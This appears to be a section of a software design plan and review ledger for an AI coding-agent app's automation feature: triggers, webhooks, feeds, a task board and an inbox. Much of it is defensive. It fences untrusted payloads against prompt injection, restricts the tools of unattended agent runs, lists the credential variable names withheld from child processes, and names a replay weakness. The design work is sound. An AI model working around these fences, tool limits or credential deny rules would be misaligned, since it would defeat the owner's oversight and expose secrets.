  - **Providers:** pi-web's ten (`openai-codex`, `deepseek`, `openrouter`, `moonshotai`, `moonshotai-cn`, `minimax`, `minimax-cn`, `vercel-ai-gateway`, `opencode-go`, `kimi-coding`).
  - **Endpoints:** pinned per provider to its official origin. A provider whose configured base URL is not that origin → `query_failed` without a request (pi-web's `isOfficialProviderUsageOrigin` rule).
- **M10R110** (corrected: RT-27) [18] It runs in a helper op (`helper/ops/models-usage.ts`): credentials are resolved by Pi's `ModelRuntime` inside the helper, never in the daemon.
  - **Offline load** (MC52): the helper loads Pi's configuration without installing anything; a missing package is a fixed failure, never an install.
  - **Key commands:** resolving a credential can run the owner's `!command` key resolver, as M7's catalog refresh does (`helper/ops/models-catalog.ts`); it runs in the helper with the helper's environment, on the owner's click only.
  - **OAuth refresh:** an expired OAuth credential may be refreshed by Pi; the new token is written once through M7's auth-store path (the helper's queued Pi write, `pi-write-queue`), never by a second writer.
  - The answer is parsed with a strict `UsageReport` schema: at most 32 buckets `{id, label ≤ 64, used?, remaining?, limit?, unit, currency?, windowMinutes?, resetsAt?, period?}`, at most 32 metrics.
  - Failures are fixed texts.
  - No step-up (Q14, settled without a question): official endpoints only, a read, on the owner's click.
  - One answer per provider is cached 60 s (a loop costs one request a minute).
  - Test operations stub the transport (network guard).
- **M10R111** [18] **Web:** a "Usage" button per supported provider in Settings › Models (one mount line in the provider detail), opening `ProviderUsage` (lazy): one Meter per bucket (used / limit, or remaining), the reset time, "checked at …"; fixed error copy. No request without the click. Cost if wrong: none.
- **M10R112** (corrected: RT-31, agreement 21) [19] **Item kinds** (the tab registry, one line each in each switch, coordination contract):
  - `{ kind: "tasks" }`: a singleton, key `tasks`, title "Tasks".
  - `{ kind: "trigger"; id: string }`: key `trigger:<id>`. `id` is a trigger id, or `new:<project id>` for an empty editor in that project. Title: the trigger's name from the tasks store, else "New trigger".
- **M10R113** (corrected: RT-34) [20] **Layout** (board 11 §2):
  - **Header bar:** "Tasks · n en cours · n en file · Aujourd'hui $x / $budget" (today's spend includes runs in progress, owner m10q13), a quiet-hours chip when inside the window, and the **pause** Switch (it writes the owner's `automation` setting with compare-and-set, `settings.set`; browser only).
  - **Columns:** one per project that has triggers or tasks. Header: project name · "n running" · cost today (tabular). A column has no slot count of its own: slots are the owner's (M10R5), shown in the header as "n / slots".
  - **Triggers strip** at the top of each column (owner m10q2, Q3 folded, in place of M11's agent status panel): name, source glyph and chip (⏱ schedule, ⇢ webhook, ◉ feed, manual), an enabled Switch (`setEnabled`), "Edit" (opens the trigger tab), and "New trigger" for the column's project.
- **M10R114** [20] **Cards** (board 11 §2: "run Investigate HighMemory · prod-alerts · 2m · isolated · Steer"):
  - **Chip:** `RunStatusChip` and `Chip` tones: `running` → run, needs input → att ("input"), `queued` → mut, `done` → ok, `failed` and `interrupted` → err, `limited` and `cancelled` → mut.
  - **Text:** the trigger name; the `detail` line inside a dashed `UNTRUSTED · <source>` frame (DESIGN §2: external content always fenced); origin · relative time · duration · cost (tabular, "$0.21").
  - **Actions per state:**
    - running: Steer (opens the session) and Cancel;
    - needs input: Reply (opens the session at its card);
    - queued: Cancel;
    - failed, interrupted, cancelled: Retry and Open, and "Use my normal tools" while the list is not lifted;
    - done: Open, and "Use my normal tools" while the list is not lifted;
    - limited: Resume now, Cancel resume, Open.
- **M10R115** [20] **Failures and the empty state:**
  - The outbox failures (this owner's and the system's, M10R148) appear as a neutral `Banner`: "n background jobs failed" with a list (kind, time, code) and Dismiss.
  - No trigger anywhere → `EmptyState` (dashed frame): "Triggers run tasks for you on a schedule, a webhook or a feed." and the primary action "New trigger" (project chooser).
- **M10R116** (corrected: RT-03, RT-13, RT-28, RT-34, owner m10a4, m10a5, m10q7) [21] **Editor** (board 11 §1, left):
  - **Header:** name field, enabled chip, "Fire now" (the saved trigger; disabled while there are unsaved changes, with the tooltip "Save first"), "Save" (create or update). Save asks for the password through the shell's step-up host when the daemon answers `step_up_required`.
  - **Source:** a Segmented Schedule / Webhook / Feed / Manuel.
    - **Webhook:**
      - the URL with Copy;
      - after a create or rotation, the secret in a Dialog: "Copy it now: pap does not show it again." with Copy;
      - auth mode (secret / HMAC: the combined mode is gone, owner m10a5) and, for HMAC, the header;
      - format (Brut / Alertmanager / Grafana);
      - the limits line "64 KB · 60/min · 20 en file · dédup N min";
      - "Run on resolved alerts";
      - Rotation.
    - **Schedule:**
      - an RRULE field with presets (hourly, daily, weekdays, weekly: Orca's `buildAutomationRrule` shapes) and a live list of the next 5 fires in the trigger's zone (`nextOccurrences`; a refusal shows its reason);
      - a time-zone select, filled with the browser's zone for a new trigger (`Intl.DateTimeFormat().resolvedOptions().timeZone`, RT-34);
      - catch-up once.
    - **Feed:** URL and "every N minutes".
  - **Exécution** (board: "isolated-task"):
    - "Cible": "Tâche isolée", selected and fixed, with "Thread d'un agent · arrives with agents" disabled (owner m10q1);
    - the folder;
    - "Outils autorisés · liste fermée": checkboxes for `read grep find ls bash edit write` and added names (validated by `ToolName`). Unchecked tools are shown struck through, as on the board. A note under `bash`, `edit`, `write` that says **exactly what asks under the chosen mode** (RT-13; the run is tainted for a webhook or feed source):
      - `read-only`: "Blocked: this mode never runs them";
      - `supervised`: "Each call asks you (Inbox); unanswered after 10 minutes, it is denied";
      - `auto-accept-edits`: "edit and write inside the folder run without asking; bash asks you (Inbox)".
      A second note when a name other than `read grep find ls` is listed: "The read-only preset is off: calls follow the approval mode" (RT-28). The board's excluded `git push` line is not offered: a by-name list cannot exclude one subcommand (ADR 0041 says so);
    - mode (read-only / supervised / auto-accept-edits), pre-set from the source as the daemon would (`supervised` for webhook and feed, owner m10a4);
    - "Variables for the precheck": names only (owner m10q7), validated by `EnvName` in the form, with the note "Never passed: the SSH agent, provider and cloud keys (ANTHROPIC_*, OPENAI_*, AWS_*…), GIT_*, LD_*, and names that look like credentials (…TOKEN, …API_KEY, …SECRET, …PASSWORD). Set such a value inline in the command or read it from a file." (M10R151);
    - "Precheck · exit 0 = fire" text area (with the note "not run for webhooks");
    - "Si interrompu: Ne pas relancer / Relancer";
    - "Budget du run: max N min · max $" ($1 pre-set for webhook and feed; "no cap" is a choice);
    - the trigger's own daily budget.
  - **Prompt:** a text area with the note "{{payload}} is always fenced".
- **M10R117** (corrected: RT-05, RT-13, RT-26, RT-32) [21] **Dry-run panel** (board 11 §1, right; "rien n'est écrit"):
  - a sample payload text area (webhook, feed, manual) and "Dry-run" (sends the unsaved draft);
  - the `TriggerVerdict`: "would fire 1 isolated task" or "would skip · <reason>", with the gates' lines (dedup, precheck exit and time, budget);
  - tools, "Profil: read-only preset · supervised · starts tainted" (plus "edits in this folder run unasked" when `editsUnasked`), the folder with its Pi trust ("confiance ✓", from M7's `trust.status {cwd}`, board 11), "Tokens: none", and "feed not fetched in a dry-run" for a feed trigger;
  - the exact prompt, its fences rendered with DESIGN's `Fence` (dashed attention frame, `UNTRUSTED · <source>`, dimmed text);
  - the board's note: "Le payload est clôturé et ne peut pas fermer la clôture (id aléatoire). La session de la tâche démarre contaminée…".
- **M10R118** [21] **Journal** (board 11 §1, bottom; "Journal des tirs · tous · tirés · refusés"):
  - a table When / Verdict chip (fired ok, dedup mut, precheck mut, budget att, 401 err, missed mut, error err, …) / Détail / Tâche (a link to the session) / Durée / Coût;
  - collapsed lines show "×12" and their time range;
  - filters all / fired / refused; "Load more".
- **M10R119** (corrected: RT-32, owner m10a3) [22] **The drawer** (`InboxDrawer.tsx` keeps its Dialog and gets the content):
  - **Header:** "Inbox · n à traiter" and "Tout lire" (`inbox.markRead {all}`).
  - **Filters:** Tout / À traiter / Tâches; "Réponses" is not shown until M11 has replies.
  - **Rows:** a task glyph where the board has an agent avatar (no agents yet); the title ("prod-alerts · attend ta réponse", "· terminée", "· échec", "· interrompue", "· limite atteinte", and "· refusé (pas de réponse)" for a question denied at its timeout); a kind chip; the relative time; the cost.
  - **Order:** rows to handle first, on the attention tint (DESIGN §2 "solid pink = waiting for you"), then by time.
  - **Click:** opens the session (a shell callback) and marks the row read.
  - **Empty:** `EmptyState`.
- **M10R120** [22] **Fences in user messages:** a task's first message is the rendered prompt. `MessageRow` splits a user message with the existing `splitFences` and renders a fenced part in DESIGN's `Fence` (≤ 6 lines). A forged fence in a user's own text can only make text look untrusted, never the reverse (`splitFences` honours only an opening whose own id closes it). Cost if wrong: a task prompt shown as raw markers.
- **M10R121** (corrected: RT-34, owner m10a1, m10q6) [23] **Section `automation`**, after `skills` in `SETTINGS_SECTIONS` (one line; M9 adds no section, agreement 21). Three groups:
  - **Automation** (this account's): pause; slots (1–8, "your automatic runs at once; one worker always stays free for you"); time zone (shown as the server's while unset; the first save stores the browser's zone, RT-34); quiet hours from / to with the note "Runs still execute; notifications wait (with M12)"; the daily budget in $ with "No budget" and the note "counts every automatic run, the ones in progress too"; auto-resume after a quota limit, with the note "never for a session in full access". One compare-and-set document (`settings.set automation`; a token cannot write it, M10R162).
  - **Spending (owner m10q13):**
    - a Segmented today / 7 days / 30 days from `usage.summary`;
    - today's Meters against the budget;
    - a table by provider and model with tokens, runs and cost, a subscription's cost labelled "API-equivalent";
    - totals by origin (you, triggers, resumes, extensions).
  - **Observability (read-only):**
    - "Prometheus /metrics: on" or "off (set PAP_METRICS_TOKEN)";
    - "OTLP export: on, to <host>" or "off";
    - the trace file and the hint `pap trace summary`.
- **M10R122** [24] **ADRs** (M10 takes 0040–0046, coordination contract), each with Status, Date, Spec section, Context, Decision, Consequences:
  - **0040** "The outbox in the kernel, replay classes and recovery first" (C §1.1, §6.2–6.3): deadlines per kind, two handlers at most and never two of one kind, a row settled only with its handler's own result; the sent mark and the cancel mark; owners on rows; `task.start` admits round-robin by trigger; a deferral is not an attempt; failed rows stay until dismissed; no recovery in read-only mode. The deviation: `run.abort` is not an effect (Cancel commits, then aborts directly; the boot kills every worker); M9's lane effects stay in M9's rows until M11 (agreement 15).
  - **0041** "Automation runs before agents" (C §5.3, §6.1; a deviation until M11):
    - project triggers, isolated task sessions, the `interactive` profile narrowed by the closed allowlist, the unattended block of unknown tools and unreadable commands, never full-access (refused on the session while the task runs), `supervised` by default for outside text, the read-only preset only for read tools, taint from fenced input;
    - questions wait in the Inbox 10 minutes, then are denied and the run goes on;
    - one worker kept for the owner; a finished task's worker released; done task sessions archived, then deleted after 30 days if never reopened; "Use my normal tools" after the end;
    - board 11's excluded `git push` cannot be expressed by a by-name list (a residual until bwrap and M11's per-command rules);
    - columns per project.
  - **0042** "Webhook authentication" (C §4.4, §6.4): Bearer (any case) or `X-Pap-Secret`, the two modes (the combined one dropped: its key travelled), the secret on disk, the Origin exemption of the exact path, authentication before any backoff, the two body pools, `connection: close` on every refusal, dedup as replay protection, statuses. Residuals: a captured `hmac` body can be replayed after its dedup window; an outsider who knows four `hmac` URLs can hold the unauthenticated pool.
  - **0043** "The runs registry and cost" (C §3.4, A §3): Pi's price as the API-equivalent, compaction counted, billing from OAuth, the JSONL line through `labelValue`, `sessionCost` for M9's compare, `markEnding`, the budget counting runs in progress, the `usage` stream instead of a session snapshot field; uncounted: `auto_name`, ✦ Suggest and branch summaries (controller C1).
  - **0044** "Observability" (C §9.4): the trace file and its closed attributes, `/metrics` counters from the database, OTLP JSON opt-in, the stall monitor.
  - **0045** "Quota limits and auto-resume" (C §6.4): reset times read from provider text, T3's rules, the receipt, the cancel and sent marks, never for `full-access`.
  - **0046** "Feeds and the precheck without a sandbox" (C §6.4): the address guard (the IPv4-embedding IPv6 forms included, checked at save and at each poll), the parser without entities, M9's shared allowlisted environment (`unattendedEnv`, contracts, re-exported by `kernel/child-env.ts`; owner c7) keeping the network and tooling names and the trigger's variable names, the kernel-tracked group kill, the `setsid` residual.
- **M10R148** (new: RT-16) [2, 5a, 20] **The outbox has owners.** `outbox.owner_id` is the effect's owner, NULL for a system effect (`attachment.cleanup`, which holds no owner data). `failures(ownerId)` lists that owner's rows and the system's; `dismiss(ownerId, id)` dismisses one of them, else false (`not_found` at the RPC). Why: owner B's banner listed A's failures and B could dismiss them. Cost if wrong: an effect's kind and error seen across accounts.
- **M10R149** (new: RT-21) [2, 17] **Two durable marks.**
  - **Cancel mark:** `cancelEffect(dedupKey)` retires a pending row, and sets `cancel_requested` on a leased one; the handler reads `cancelRequested()` right before its point of no return and settles `done` without acting.
  - **Sent mark:** a handler calls `markSent()` right before the step that must never run twice (the resume's prompt). From then on a crash retires the row instead of requeuing it, and a `retry` or `defer` of that row fails it (`defer_after_send`).
- **M10R150** (new: RT-07) [2, 5a, 5b, 7a, 8a, 10, 12, 13, 15] **Read-only mode and contained timers.**
  - In read-only mode (`migrate()` → `readOnly`): no recovery (outbox, runs, tasks), no outbox worker, no scheduler, no housekeeping, no feed poll, no trace or stall file write, no OTLP timer; the hook route answers `503 read_only` before it reads the body (with `connection: close`). Reads and the RPC catalogue still work; the dispatcher answers mutations `read_only` as today.
  - `kernel/timer-guard.ts` `guardTimer(logger, name, work)` wraps every M10 timer callback (outbox loop, housekeeping, scheduler, feed polls, stall sampler, OTLP flush, the runner's deadlines and question timers, the usage stream's throttle): a throw or a rejected promise is logged as `<name>_failed`, at most once a minute per name, and never reaches the event loop; the caller re-arms its next tick in a `finally`.
- **M10R151** (new: owner c7, m10q7, agreement 8, settled by the M9 fix) [1, 9] **The shared child environment, consumed.** M9 owns `unattendedEnv(base, { keep, set })` in `packages/contracts/src/child-env.ts` (contracts, because pi-host's helper imports only contracts) and its re-export `apps/daemon/src/kernel/child-env.ts` (agreement 8's path); it adds them and merges first. M10 consumes them: Task 1 lands M9's contracts block and tests verbatim (for `EnvName`), this task lands M9's re-export and its test verbatim, and after the rebase M10 imports M9's files (identical, so nothing to resolve; if M9's differ, M9's win and M10's precheck tests must still pass). The precheck's environment is `unattendedEnv(process.env, { keep: [...NETWORK_ENV, ...TOOLING_ENV, ...trigger.execution.env] })`, nothing `set`: the base allowlist (`HOME`, `USER`, `LOGNAME`, `LANG`, `LC_*`, `TZ`, absolute `PATH`, `TERM=dumb`), the proxies and CA bundles a `curl` or `kubectl` needs on the owner's network, `TMPDIR` and `XDG_*`, and the trigger's names (owner m10q7). Whatever a trigger names, `isNeverPassedEnvKey` withholds the SSH agent, provider keys and forge tokens; by the controller's ruling an unattended child never gets `SSH_AUTH_SOCK` or a provider key (only a click-started child, the owner's push, keeps the agent), and the precheck is unattended. Friction (owner page, M9's list): a value only in an environment variable of the `AWS_*` or another provider family, or with a credential-looking name, is not passed; the command sets it inline or reads a file. Why: decision 79's option chosen for every child (c7); the precheck runs unattended and its output can reach a prompt. Cost if wrong: a provider key or the SSH agent in a command run at 03:00 by a feed.
- **M10R152** (new: RT-12, owner m10a2) [1, 4a, 4b, 5a, 5b] **Unattended.** `PolicyRules.unattended` is true while the session's task is not terminal (Task 4b composes it; Task 5b ends it). Then, besides M10R27's block: lever B withholds its question (`markAskable` gains `&& !call.rules.unattended`), so a command the reader cannot check blocks, as decision 71 says for unattended sessions. Everything else is unchanged: the matrix still asks for `bash`, `edit`, `write` per the mode (they wait in the Inbox, M10R39). The worker does not pin `unattended`: it goes false by a `policy_update` when the task ends. Why: decision 34 ("unknown tools ask (block when unattended)"), ADR 0002 ("an unattended profile blocks both … until M10, M11"). Friction (owner page): an extension tool with no annotations cannot run in a trigger until it declares a category. Cost if wrong: an unattended run asks a question nobody reads about a tool pap cannot judge, then runs it on a late answer.
- **M10R153** (new: RT-37, owner m10a7) [4b, 5b, 20] **"Use my normal tools", and no `full-access` while the task runs.**
  - `policy.setSessionMode` to `full-access` on a session whose `unattended = 1` answers `session_busy` (`session-service.ts`, one check): the mode chip cannot make a running task unasked.
  - `clearTaskPolicy` lifts the list once the task ended; Task 5b's `automation.tasks.releaseTools` (browser, step-up) calls it, then `release` so that the next prompt starts a worker without the pin.
- **M10R154** (new: RT-09, owner m10a6, agreements 11, 12) [4b, 5a, 5b] **One worker kept for the owner; release at task end.** `createTaskSession`, and a `prompt` that reopens a cold task session, refuse `capacity` unless one worker stays free afterwards (`live + starting + 2 ≤ maxWorkers`). With `PAP_MAX_WORKERS=2`, one automatic run at a time; with 1, none (a boot warning `automation_no_worker` says so). `release` stops an idle worker at once (the runner calls it when a task becomes terminal, Task 5b); until the rebase on M9 it applies the same idle rule locally (`status() === "idle"` and no dialog, panel or queued message), then calls M9's `releaseIdle`. Cost if wrong: automation fills the cap and the owner's `sessions.create` answers `capacity`.
- **M10R155** (new: RT-15, owner m10q10) [4b, 5b] **Deleting a done task session.** `deleteTaskSession` refuses a session with a live, starting or reopening worker (`busy`); else, in one transaction, the sessions row (`session_policy` cascades) and its marks; then the Pi file, only when `isPiSessionFile(agentDir, row.piPath)` holds, with `rmSync(path, { force: true })` (never recursive; a link is unlinked, never followed). The runs rows keep the money and the history; the search scanner forgets the gone file (`scanner-file.ts` `gone`); the attachments folder goes with Task 16's cleanup. A crash between the row and the file leaves a file the scanner adopts as an outside session (tainted, no list): named in `automation.md`. Cost if wrong: a deleted session the owner wanted, or a file outside Pi's sessions folder removed.
- **M10R156** (new: RT-22) [12, 5b] **The runner's aborts say why.** `markEnding(sessionId, class)` tags the session's open run; when it ends `cancelled` the row and the JSONL line carry that `error_class` (`deadline`, `run_budget`, `budget`; the CHECK gains `budget`) instead of `aborted`, and `RunEndEvent.errorClass` lets Task 5a leave the task as Task 5b set it. A tag on a session with no open run is dropped. Cost if wrong: every runner abort reads as a person's Stop.
- **M10R157** (new: RT-24) [1, 5a] **One payload, one precheck.** The template takes `{{payload}}` and `{{precheck}}` at most once each (Task 1); a rendered prompt over `RENDERED_PROMPT_MAX` (131 072, the `tasks.prompt` CHECK) is still caught in `fire`: journal `error` `prompt_too_large`, the hook answers 413 (never 500, which Alertmanager retries for ever). Cost if wrong: a 500 loop.
- **M10R158** (new: RT-26) [3, 10] **The feed address at save.** `automation.triggers.create` and `update` run `feedUrlRefusal` on a feed trigger's URL and refuse a literal non-public address, a non-https scheme or credentials with `bad_request` (one line in `triggers.ts`), so `https://127.0.0.1/` is never saved to fail at every poll. Names are judged at each poll only (DNS changes). Cost if wrong: a trigger that looks fine and never polls.
- **M10R159** (new: RT-39, agreement 17) [4b] `policy-link.ts` `answeredBy` records actor `system` for `credentialId === AUTOMATION_CREDENTIAL` (`token` for a token, `user` otherwise): the runner's timeout denials are not the owner's answers. Cost if wrong: an audit trail that says the owner denied a call at 03:00.
- **M10R160** (new: RT-08, owner m10q5) [5b, 17] A `limited` task whose resume the runs module skips for the budget (`RunsPort.onResumeSkipped(session, "budget")`, Task 17) → `failed budget`, with its end hook. One skipped because the session was archived → `cancelled archived`. Cost if wrong: a task stuck `limited`.
- **M10R161** (new: RT-17) [7b, 24] **Journal lines of refusals and the replay residual.** Unauthenticated attempts are one collapsed journal line per trigger and 10-minute window, `unauthorized` with a count ("401 secret invalide · 3 tentatives non authentifiées"), and a log line with the trigger id and the count, never a header or a body. In `hmac` mode a captured signed body can be replayed once its dedup window (≤ 1 440 minutes) has passed: ADR 0042 names it, with the owner's levers (a longer `dedupMinutes`; GitHub's own redelivery checks), rather than keeping a hash of every signed body for 7 days. Cost if wrong: a flood fills the journal, or a replay nobody documented.
- **M10R162** (new: RT-04, owner m10a1) [12, 5a, 8b, 17, 23] **The automation settings port, browser-written.** `settings.port.automation(ownerId)`: the parsed `AutomationSettings`, the defaults for a missing or damaged row (logged), as `models()` does. `settings.set` with `key: "automation"` from a token caller → `forbidden` (`modules/settings/service.ts`, one check): a token cannot lift the budget, unpause or add slots. It lands here because this task needs the time zone first (lane B, before JOIN 1). Cost if wrong: a token sets `dailyBudgetUsd: null` and spends without limit.

## Owner answers (2026-10-14, decision 81)

| Ruling | Answer |
|---|---|
| **M10R123** | c1 = a: M9 merges first; M10 rebases once (its migrations already re-dated `2026101420xx`), wires the disk floor and `sessionCost` lines in M9's `compose-lanes.ts`, takes M9's `fence.ts`, `child-env.ts` and `releaseIdle`. The exception: M10 passes its Opus final review more than one working day earlier — then the mirror |
| **M10R124** | c2 = a: an Opus implementer at fix rounds 4–5 is pre-approved for this wave, logged in the ledger |
| **M10R125** | c3 = a: Sonnet implementers on every task, never Haiku |
| **M10R126** | c4 = a: M9's reviewer list with the red-team's additions — no change to this plan |
| **M10R127** | c5 = a: M10's Opus reviewers are the draft's 13 plus 8b, 12 and 5a/7a (with 4a/4b and 5b inheriting Task 4's and Task 5's line); Task 15 stays Opus |
| **M10R128** | c6 = a: an Opus final review of the whole branch |
| **M10R129** | c7 = a: every child spawned without the owner gets one allowlisted environment, `unattendedEnv(base, { keep, set })` in `packages/contracts/src/child-env.ts` (re-exported by `kernel/child-env.ts`, M9's files); M10's only such child is the precheck |
| **M10R130** | m10q1 = a: a project folder owns a trigger; runs are isolated task sessions there; M11 adds agent triggers |
| **M10R131** | m10q2 = a (Q3 folded): Tasks board columns per project, a trigger strip atop each, plus ⌘K |
| **M10R132** | m10q4 = a: a closed tool list per trigger, Pi's read tools by default; `bash`, `edit`, `write` may be listed and then ask through the Inbox per the mode; never `full-access` |
| **M10R133** | m10a2 = a: while a task runs, unknown tools and unreadable commands block (decision 34, ADR 0002, lever B) |
| **M10R134** | m10a3 = a: an unattended question waits 10 minutes, then the call is denied and the run continues |
| **M10R135** | m10a4 = a: webhook and feed triggers default to `supervised` (each edit asks) |
| **M10R136** | m10a7 = b: after the task ends, "Use my normal tools" (browser, password step-up) lifts the tool list; while it runs, `full-access` is refused |
| **M10R137** | m10q6 = a: auto-resume after a quota stop is on for every session except those in `full-access` |
| **M10R138** | m10q7 = b: the precheck gets the allowlist plus, per trigger, names of daemon variables to pass (names only, never values) |
| **M10R139** | m10a6 = a: automation never takes the last worker, and a task's worker is released when the task ends |
| **M10R140** | m10a5 = a: the combined `secret+hmac` mode is dropped; `secret` and `hmac` stay |
| **M10R141** | m10q5 = a: $5 a day; runs in progress and a token's fires count toward it |
| **M10R142** | m10a1 = a: tokens cannot write the `automation` setting (only the browser does), and a token's fires count |
| **M10R143** | m10q9 = a: the Inbox holds automation tasks only (needs input, done, failed, interrupted, limited) |
| **M10R144** | m10q10 = a: a done task's session is archived (reversible), then deleted with its Pi file 30 days after the task if never reopened |
| **M10R145** | m10q11 = a: attachments go 30 days after the session's last activity, daily |
| **M10R146** | m10q12 = a: `PAP_METRICS_TOKEN` in the environment; `/metrics` off when unset |
| **M10R147** | m10q13 = a: spending in Settings › Automation › Spending (today, 7 days, 30 days) plus today's total on the Tasks board |
## Execution rulings (controller, while the plan ran)

Numbered MC1, MC2 in `rulings.md` of the run; the others are the ledger lines that record a ruling (task, then the ruling and its cost if wrong). Order of the ledger.

- MC1 [1, 3, 11, 12] The RT-04 token rule must exist before any task reads the budget. Task 3, the first lane-A daemon task, lands the guard: a `settings.set` that touches `automation` (budget, caps) needs `automation:admin`, so a token is refused. Its test goes through the real settings service with a token caller. Task 12 keeps only what remains of the brief. — why: the review found a token can write `dailyBudgetUsd: null` today, and 5a/8b read the budget before lane B's Task 12. — cost if wrong: a guard moved one task earlier.
- MC2 [3, 12] supersedes MC1. The RT-04 token guard and the automation settings port stay in Task 12 (M10R162), as the plan has them.

- Task 1: review (Sonnet) ✅ Approved — 0 C/0 I, 7 minors. Controller fix d330c18: literal bidi/zwsp in automation.hostile.test.ts → \u escapes; HIDDEN_IN_TEXT gains C1 \u007F-\u009F (+ test row, mutant fails). Ruling MC1: RT-04 token guard moves into Task 3 (real settings service test). Parked minors: 3 (permissions arrayContaining), 4 (length caps crossing), 5 (child-env/fence test files: take M9's at rebase).
- Ruling MC2 supersedes MC1: token guard stays in Task 12 (J1 precedes 5a).
- Task 4b: review (Opus) spec ❌ / Needs fixes — I1 setSessionMode(null) + later defaultMode full-access reaches live unattended worker (M10R153); 9 minors parked. Controller ruling: refuse null while unattended + clamp in taskRules (two locks). Fix round 1 → resume implementer.
- Ruling: T5a dispatched on 82fee86 while the J1 gate runs — light gates are clean and the conflicts were unions; if the gate fails, fix lands on lane A before T5a's own gate — cost if wrong: T5a rebase onto a fix commit.
- [B] Task 14: review (Opus) spec ✅ / Needs fixes — I1 path-shaped model/provider id reaches a label (labelValue allows '/'; test passes only because its path has a space; M10R97 forbids paths); 11 minors parked; 5 concerns accepted. Ruling: labelValue refuses a leading '/', '~' or '.' and any '..' (same fallback as other refused values), test with a space-free path. Carry → T15: re-source pap_otlp_dropped_spans_total from the OTLP exporter. Fix round 1 → resume implementer.
- Ruling (controller corrects its own dispatch note): RT-13 = the DEFAULT mode is supervised for webhook/feed (M10R4 withDefaults); an explicit owner choice (auto-accept-edits) is kept, the editor note (M10R116) and dry-run (M10R64) say what runs unasked. Remove the runner clamp in modeOf — owner wants ask-instead-of-block, plan never clamps — cost if wrong: an owner-chosen auto-accept-edits webhook edits unasked, which is what the owner chose with an honest note. Folded into fix round 1.
- [B] Task 15: review (Opus) spec ✅ (2 ⚠️) / Approved; 0 C/I; 10 minors. Rulings: (1) OTLP flush moves from the start of m10.stop() to the closers at the END of the daemon stop (agreement C3), so the stop's own spans are exported/counted; (2) 'returns within 2 s' = the flush's own deadline, not the whole stop — test asserts the flush bound; (3) kernel/config.ts 379/400 with M9, T11, T16 additions still to join → move OTLP parsing to its own kernel file now. Fix round 1 → resume implementer.
- [B] Task 15: fix round 1 DONE (966b996) — trace_export closer registered by composeM10Early(core, closers) (daemon.ts in-place, no new line), stall.stop stays in m10.stop; flush-bound int test 1.9–2.6 s; kernel/config-otlp.ts (config.ts 323). unit 10925 + 5 int files. Controller-verified (diff read): rulings met.
- [B] Task 16: review (Opus) spec ✅ (3 join-time checks: 5b daily enqueue, 5a maps disk_low from createTaskSession, M9 diskFloor after merge) / Approved; 0 C/I; 12 minors parked — sweep priority: m1 cleanup can delete an attachment just copied into a session idle 30+ days before updated_at bumps (fix: skip files with mtime < 30 days, or a live-worker guard); m8 fork/clone error lists lack rate_limited/disk_low. Ruling m9: sessions/index.ts +10 vs agreement-10 budget 4 accepted (no conflict with lane A or M9; recount at J2).
- Task 5b: review (Opus) spec ✅ (2 rulings needed) / Approved; 0 C/I; 15 minors parked.
- Ruling 1 (M10R66): a trigger's own daily budget checked across running tasks → Task 8b (it builds the trigger budget gate; money, Opus-reviewed) — cost if wrong: the owner's budget still caps the total.
- Ruling 2 (M10R153): a kept session whose task row housekeeping deleted must stay liftable — 'Use my normal tools' resolves by session (owner-checked, audited, same confirmation) when the task row is gone, instead of not_found. Fix round 1 → resume implementer.
- Task 5b: fix round 1 DONE (777a65f) — releaseTools takes {taskId}|{sessionId}, returns {taskId|null, sessionId} (contract change); by-session lift owner-only, step-up, audited; mutant fails; unit 11024 + int 55. Controller-accepted (ruling met, tests listed). Carry → Tasks 19–23 web: pass sessionId for kept sessions whose task row is gone.
- Rulings: I1 defer while an owner prompt or reopen is in flight (sessions port exposes it); I2 defer while paused (token → automation_paused), re-read autoResume at fire time; I3 resumeNow on a still-limited session never answers a silent ok (superseded in the fix: the click sends inline in every state, no fresh outbox row; see deviation 9); I4 admits() uses the same capacity check as launch (reserve + free-memory floor) → defer; I5 the owner's 'Resume now' click runs under the owner's interactive origin (not 'resume'), so the automation budget never aborts it; scheduled auto-resume stays 'resume'. Fix round 1 → resume implementer.
- Ruling (integrator concern): a click-resumed task must not be failed with 'budget' by runningGated — the owner took over (M10R106): runningGated skips a task whose current run has origin 'user'; the automation budget still gates the next automatic step. Small fix + test → integrator, then Opus review of the J2 wiring.
- JOIN 2: click-resume ruling DONE (8c64e90) — limits.ts skips a gated task while its session's open run is origin 'user' with no task; 2 tests + mutant; unit 11316. Opus review of the J2 wiring + resolutions dispatched → join-2-review.md
- Ruling: lane A continues on 71b3261-based history (7b → 8a → 8b) and is rebased onto lane B (J2 head) at J3 with rebase --onto; mount-line union then.
- Ruling I1: fix (brief 5a + M10R105 promise Cancel wins): when Cancel's outbox.cancel answers 'marked' for an already-sent resume, arm a one-shot 'abort next run start' for that session; the continuation is aborted at its start (before tokens), the flag clears on that start or when the task ends; test with a held cold reopen. → integrator.
- JOIN 2: re-review 1 (Sonnet) — cold-reopen race closed; NEW Important I1-a: continuation failing before its run start leaves the flag armed ≤60 s → owner's next prompt aborted. Minor: closing-worker window (ensureLive awaits closing.exited() before reopening.set) arms nothing. Ruling: fix both — disarm(sessionId) when the armed continuation settles without a run start (run.resume failure/skip path); arm on the resume's own 'sending' set instead of promptPending. → integrator round 2.
- JOIN 2: complete (lane B 0e5fa6c on lane A 71b3261; wiring d009dcf, 8c64e90, bbf03d6, 0e5fa6c). Full gate green at d009dcf; later commits unit + targeted int. Ruling: T18's own full gate (unit, int, smoke) at its HEAD covers the J2 tail — cost if wrong: a J2 regression shows up in T18's gate, fixed there.
- Task 8b: implementer DONE_WITH_CONCERNS (9f68e5e) — RED 33/38, 75 new tests, 8 mutants; unit 3 method-list fails fixed (45 files rerun, full unit not rerun), int 687+1, build, budgets 213.7; M10R66 trigger budget stops running tasks via limits.ts (origin user + automatic resumes exempt from trigger-only budget, tested); m12 retry lists budget_reached; fireManual kept as test support, automation.fire real; runner.ts 395→362 (retry.ts); precheck port optional, unwired until T9. Ruling (concern 1) → Task 9: the precheck runs AFTER the pause and budget gates (cheap refusals first; a paused/over-budget token fire never spawns the command). Concern 2 (dry-run omits 'disabled' for manual) accepted (M10R57). Review (Opus) dispatched → task-8b-review.md
- Ruling I1 (ask-instead-of-block): the helper loads the same enabled+trusted extensions the sessions load, offline (PI_OFFLINE=1); if the provider's EFFECTIVE base URL is not the official origin → refuse with a clear code (provider_overridden), and an extension load failure refuses too (fail closed). Ruling minor: the deadline bounds the usage request only, never credential resolution/refresh. Fix round 1 → resume implementer.
